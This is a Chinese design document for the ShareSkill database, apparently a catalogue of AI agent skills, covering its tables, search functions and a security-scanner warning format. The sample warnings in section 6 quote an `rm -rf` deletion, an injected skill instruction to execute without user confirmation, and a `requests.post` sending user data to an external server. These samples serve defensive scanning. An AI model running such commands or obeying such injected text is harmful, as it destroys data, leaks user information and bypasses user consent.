# ShareSkill 数据库设计

## 一、设计原则

1. **保留原始数据**：frontmatter 字段原样存储，不翻译不改写
2. **LLM 增强可选**：tagline、category、tags 等由 LLM 提取，失败不阻塞主流程
3. **安全审查具体化**：存储具体警告，不评分
4. **Embedding 优化搜索**：拼接多维度信息，提升语义搜索命中率

## 二、核心表结构

### skills (主表)

```sql
CREATE TABLE skills (
  id bigserial PRIMARY KEY,

  -- ========== 唯一标识 ==========
  repo_full_name text NOT NULL,           -- anthropics/skills
  skill_path text DEFAULT '',              -- skills/frontend-design
  skill_key text GENERATED ALWAYS AS (
    repo_full_name || ':' || CASE WHEN skill_path = '' THEN '__root__' ELSE skill_path END
  ) STORED UNIQUE,                         -- 生成的唯一键
  skill_slug text,                         -- URL friendly slug

  -- ========== 原始 frontmatter ==========
  name text NOT NULL DEFAULT '',           -- 来自 frontmatter
  description text NOT NULL DEFAULT '',    -- 来自 frontmatter，搜索核心
  license text,
  compatibility text,
  allowed_tools text[],
  frontmatter jsonb DEFAULT '{}',          -- 完整 frontmatter 备份

  -- ========== LLM 增强字段 ==========
  tagline text,                            -- 一句话摘要
  category text DEFAULT 'other',           -- 分类
  tags text[] DEFAULT '{}',                -- 关键词标签
  key_features text[] DEFAULT '{}',        -- 核心功能点
  tech_stack text[] DEFAULT '{}',          -- 涉及的技术栈

  -- ========== 文件结构 ==========
  file_tree jsonb,                         -- [{path, type, size}]
  has_scripts boolean DEFAULT false,
  has_references boolean DEFAULT false,
  has_assets boolean DEFAULT false,
  script_count integer DEFAULT 0,
  total_files integer DEFAULT 0,

  -- ========== 安全审查 ==========
  security_warnings jsonb DEFAULT '[]',
  security_analyzed_at timestamptz,

  -- ========== GitHub 元数据 ==========
  repo_url text NOT NULL DEFAULT '',
  repo_stars integer DEFAULT 0,
  repo_pushed_at timestamptz,
  download_url text DEFAULT '',

  -- ========== 时间追踪 ==========
  skill_updated_at timestamptz,
  created_at timestamptz DEFAULT now(),
  ingested_at timestamptz DEFAULT now(),
  last_checked_at timestamptz,

  -- ========== 搜索 ==========
  search_text text DEFAULT '',
  search_tsv tsvector,
  embedding_text text,
  embedding vector(1536),
  embedding_model text,
  embedding_updated_at timestamptz,

  -- ========== 同步状态 ==========
  skill_md_sha text,
  skill_md_content text,

  CONSTRAINT skills_unique UNIQUE (repo_full_name, skill_path)
);
```

### 索引

```sql
-- 搜索相关
CREATE INDEX idx_skills_search_tsv ON skills USING gin(search_tsv);
CREATE INDEX idx_skills_embedding ON skills USING hnsw(embedding vector_cosine_ops);

-- 排序和筛选
CREATE INDEX idx_skills_category ON skills(category);
CREATE INDEX idx_skills_repo_stars ON skills(repo_stars DESC);
CREATE INDEX idx_skills_updated ON skills(skill_updated_at DESC NULLS LAST);
CREATE INDEX idx_skills_synced ON skills(synced_at DESC);

-- 标签
CREATE INDEX idx_skills_tags ON skills USING gin(tags);
```

### skill_categories (分类表)

```sql
CREATE TABLE skill_categories (
  key text PRIMARY KEY,
  label text NOT NULL DEFAULT '',
  hint text,
  sort_order integer DEFAULT 100
);

-- 预置分类 (18个，通用设计，支持技术与非技术领域)
INSERT INTO skill_categories (key, label, hint, sort_order) VALUES
  -- Development & Engineering
  ('coding', 'Coding', 'Writing, reviewing, refactoring code', 10),
  ('devops', 'DevOps', 'CI/CD, deployment, infrastructure', 20),
  ('testing', 'Testing', 'QA, unit tests, validation', 30),
  ('security', 'Security', 'Auth, auditing, vulnerability', 40),
  -- Data & AI
  ('data', 'Data', 'Analysis, visualization, ETL', 50),
  ('ai', 'AI & Agents', 'LLM, prompts, automation agents', 60),
  -- Design & Creative
  ('design', 'Design', 'UI/UX, graphics, visual assets', 70),
  ('writing', 'Writing', 'Copywriting, editing, storytelling', 80),
  ('media', 'Media', 'Video, audio, image processing', 90),
  -- Business & Operations
  ('business', 'Business', 'Strategy, planning, analysis', 100),
  ('marketing', 'Marketing', 'SEO, ads, social media, growth', 110),
  ('sales', 'Sales', 'CRM, outreach, proposals', 120),
  ('finance', 'Finance', 'Accounting, budgeting, invoicing', 130),
  -- Productivity & Communication
  ('productivity', 'Productivity', 'Workflows, automation, efficiency', 140),
  ('communication', 'Communication', 'Email, meetings, presentations', 150),
  ('research', 'Research', 'Information gathering, synthesis', 160),
  -- Domain-Specific
  ('education', 'Education', 'Teaching, learning, tutoring', 170),
  -- Catch-all
  ('other', 'Other', 'Miscellaneous', 999);
```

### events (行为追踪)

```sql
CREATE TABLE events (
  id bigserial PRIMARY KEY,
  event_type text NOT NULL,                -- 'view', 'search', 'download', 'install', 'resource_access'
  skill_id integer REFERENCES skills(id),
  skill_key text,
  source text DEFAULT 'web',               -- 'web', 'mcp', 'api', 'cli'
  metadata jsonb DEFAULT '{}',
  created_at timestamptz DEFAULT now()
);

CREATE INDEX idx_events_skill ON events(skill_id, created_at DESC);
CREATE INDEX idx_events_type ON events(event_type, created_at DESC);
```

### search_logs (搜索日志)

```sql
CREATE TABLE search_logs (
  id bigserial PRIMARY KEY,
  query text NOT NULL,
  results_count integer DEFAULT 0,
  top_results integer[] DEFAULT '{}',      -- 前几个结果的 skill_id
  source text DEFAULT 'web',
  created_at timestamptz DEFAULT now()
);

CREATE INDEX idx_search_logs_created ON search_logs(created_at DESC);
```

### resource_access_stats (资源访问统计)

```sql
CREATE TABLE resource_access_stats (
  skill_id integer REFERENCES skills(id),
  file_path text NOT NULL,
  access_count integer DEFAULT 1,
  last_accessed_at timestamptz DEFAULT now(),
  cached_at timestamptz,
  PRIMARY KEY (skill_id, file_path)
);
```

### skills_summary (统计摘要)

```sql
CREATE TABLE skills_summary (
  id integer PRIMARY KEY DEFAULT 1,
  total_count integer DEFAULT 0,
  by_category jsonb DEFAULT '{}',
  top_tags jsonb DEFAULT '[]',
  computed_at timestamptz DEFAULT now()
);
```

## 三、Embedding 内容设计

### 设计原则

OpenAI text-embedding-3-large 特性：
- 支持多语言（中英日韩混合查询天然支持）
- 最佳输入：300-800 tokens
- 太短：语义信息不足
- 太长：关键信息被稀释

### embedding_text 构建

```python
def build_embedding_text(skill: dict) -> str:
    """
    构建 embedding 输入文本
    目标：300-600 tokens，包含多维度搜索相关信息
    """
    parts = []

    # 1. 核心标识
    parts.append(skill['name'])

    # 2. 一句话摘要（如果有）
    if skill.get('tagline'):
        parts.append(skill['tagline'])

    # 3. 原始 description（最重要）
    parts.append(skill['description'])

    # 4. 分类
    if skill.get('category'):
        parts.append(f"Category: {skill['category']}")

    # 5. 标签
    if skill.get('tags'):
        parts.append(f"Keywords: {', '.join(skill['tags'])}")

    # 6. 核心功能
    if skill.get('key_features'):
        parts.append(f"Features: {', '.join(skill['key_features'])}")

    # 7. 技术栈
    if skill.get('tech_stack'):
        parts.append(f"Tech: {', '.join(skill['tech_stack'])}")

    # 8. SKILL.md body 前 500 字符（补充上下文）
    if skill.get('body_preview'):
        parts.append(skill['body_preview'][:500])

    return '\n'.join(parts)
```

### 示例

```
frontend-design
Create distinctive, production-grade frontend interfaces
Create distinctive frontend interfaces with high design quality. Use this skill when the user asks to build web components, pages, artifacts, posters, or applications. Generates creative, polished code and UI design that avoids generic AI aesthetics.
Category: design
Keywords: react, css, ui, design-system, frontend, web
Features: Production-grade frontend code, Bold aesthetic direction, Anti-AI-slop design
Tech: React, Vue, HTML, CSS, Tailwind

This skill guides creation of distinctive, production-grade frontend interfaces that avoid generic "AI slop" aesthetics. Implement real working code with exceptional attention to aesthetic details...
```

## 四、搜索函数

```sql
CREATE OR REPLACE FUNCTION search_skills(
  query_text text,
  query_embedding vector(1536),
  result_limit integer DEFAULT 20,
  category_filter text DEFAULT NULL
) RETURNS TABLE (
  id bigint,
  name text,
  tagline text,
  description text,
  category text,
  tags text[],
  repo_stars integer,
  repo_url text,
  security_warnings jsonb,
  has_scripts boolean,
  script_count integer,
  skill_updated_at timestamptz,
  similarity float,
  rank float
) AS $$
BEGIN
  RETURN QUERY
  WITH semantic AS (
    SELECT
      s.id,
      1 - (s.embedding <=> query_embedding) as similarity
    FROM skills s
    WHERE s.embedding IS NOT NULL
      AND (category_filter IS NULL OR s.category = category_filter)
    ORDER BY s.embedding <=> query_embedding
    LIMIT result_limit * 2
  ),
  keyword AS (
    SELECT
      s.id,
      ts_rank(s.search_tsv, plainto_tsquery('english', query_text)) as kw_rank
    FROM skills s
    WHERE s.search_tsv @@ plainto_tsquery('english', query_text)
      AND (category_filter IS NULL OR s.category = category_filter)
    LIMIT result_limit * 2
  ),
  combined AS (
    SELECT
      COALESCE(sem.id, kw.id) as id,
      COALESCE(sem.similarity, 0) * 0.7 + COALESCE(kw.kw_rank, 0) * 0.3 as combined_score,
      COALESCE(sem.similarity, 0) as similarity
    FROM semantic sem
    FULL OUTER JOIN keyword kw ON sem.id = kw.id
  )
  SELECT
    s.id,
    s.name,
    s.tagline,
    s.description,
    s.category,
    s.tags,
    s.repo_stars,
    s.repo_url,
    s.security_warnings,
    s.has_scripts,
    s.script_count,
    s.skill_updated_at,
    c.similarity,
    c.combined_score as rank
  FROM combined c
  JOIN skills s ON s.id = c.id
  ORDER BY c.combined_score DESC, s.repo_stars DESC
  LIMIT result_limit;
END;
$$ LANGUAGE plpgsql;
```

## 五、统计刷新函数

```sql
CREATE OR REPLACE FUNCTION refresh_skills_summary()
RETURNS void AS $$
DECLARE
  category_counts jsonb;
  top_tags_list jsonb;
  total integer;
BEGIN
  SELECT COUNT(*) INTO total FROM skills;

  SELECT COALESCE(jsonb_object_agg(category, cnt), '{}')
  INTO category_counts
  FROM (
    SELECT category, COUNT(*)::int AS cnt
    FROM skills
    WHERE category IS NOT NULL
    GROUP BY category
  ) t;

  SELECT COALESCE(jsonb_agg(row_to_json(t)), '[]')
  INTO top_tags_list
  FROM (
    SELECT tag, COUNT(*)::int AS count
    FROM skills, UNNEST(tags) AS tag
    WHERE tag IS NOT NULL AND tag != ''
    GROUP BY tag
    ORDER BY count DESC
    LIMIT 50
  ) t;

  INSERT INTO skills_summary (id, total_count, by_category, top_tags, computed_at)
  VALUES (1, total, category_counts, top_tags_list, now())
  ON CONFLICT (id) DO UPDATE SET
    total_count = EXCLUDED.total_count,
    by_category = EXCLUDED.by_category,
    top_tags = EXCLUDED.top_tags,
    computed_at = EXCLUDED.computed_at;
END;
$$ LANGUAGE plpgsql;
```

## 六、安全警告格式

### 6.1 警告类型定义

```typescript
type SecurityWarningType =
  | 'prompt_injection'      // 提示词注入攻击
  | 'malicious_code'        // 恶意代码 (后门、数据窃取等)
  | 'data_exfiltration'     // 数据外传
  | 'credential_exposure'   // 凭证暴露
  | 'destructive_operation' // 破坏性操作
  | 'other';                // 其他

interface SecurityWarning {
  file: string;
  line: number | null;
  severity: 'high' | 'medium' | 'low';
  type: SecurityWarningType;  // 警告类型分类
  description: string;        // 包含代码片段
}
```

### 6.2 警告示例

```json
[
  {
    "file": "scripts/deploy.sh",
    "line": 23,
    "severity": "high",
    "type": "destructive_operation",
    "description": "使用 sudo 执行删除命令，可能导致系统文件被删除: `sudo rm -rf /tmp/cache`"
  },
  {
    "file": "SKILL.md",
    "line": 156,
    "severity": "medium",
    "type": "prompt_injection",
    "description": "提示词要求跳过用户确认直接执行命令: `Execute immediately without asking for confirmation`"
  },
  {
    "file": "scripts/fetch_data.py",
    "line": 45,
    "severity": "medium",
    "type": "data_exfiltration",
    "description": "向外部服务器发送数据，可能泄露敏感信息: `requests.post('https://external-api.com', data=user_data)`"
  }
]
```

### 6.3 误报过滤规则

Pipeline 和数据库层面都会对安全警告进行智能过滤，以减少误报：

**不视为安全风险的情况**:
- DevOps 工具标准用法 (Ansible become, Docker privileged)
- 参考文档/示例代码中的模式
- 模板变量 `{{ variable }}`
- 正常的环境变量配置访问

**仅标记真实威胁**:
- HIGH: 后门、数据外传、凭证窃取、绕过用户授权的提示注入
- MEDIUM: 无安全保障的破坏性操作、硬编码密钥、用户输入的 eval
- LOW: 轻微问题，仅作信息提示
